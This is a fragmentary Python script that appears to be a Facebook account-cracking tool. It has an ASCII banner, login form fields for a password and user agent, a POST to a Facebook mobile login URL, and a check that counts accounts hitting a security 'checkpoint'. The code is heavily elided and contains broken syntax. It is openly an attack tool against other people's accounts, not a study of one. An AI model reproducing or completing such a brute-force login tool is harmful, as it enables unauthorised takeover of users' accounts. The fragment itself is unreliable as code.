...
#------------------[ LOGO-LAKNAT ]-----------------#
def banner():
	cetak(panel(f"""[bold blue]                ___  ____ ____ _   _ ____ _  _ _  _ _  _ 
[bold blue]                |__] |__/ |__|  \_/  |___ |\ | |\ | |\ | 
[bold blue]                |__] |  \ |  |   |   |___ | \| | \| | \|                                                                                                        
...
'pass':pw
    ...
    'user-agent': ua, 
			...
			po = ses.post(''https://m.facebook.com/?stype=lo&deoia=1&jlou=Afc7wkH8Edhdx7ply8Of3NrkwIXHfz_Tx14xaiYdaGDbpHWOgCTHhuJzyD7NU63JMBT1UY7i_bt-4dFof1umpUD_ue_Qidfe5xS8NlYBy0LotA&smuh=4353&lh=Ac_wB3DrDqsv_R43j3o&wtsid=rdr_0nr0u1AoG9mYpwHBT&_rdr',) 
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					tree = Tree(f" ")
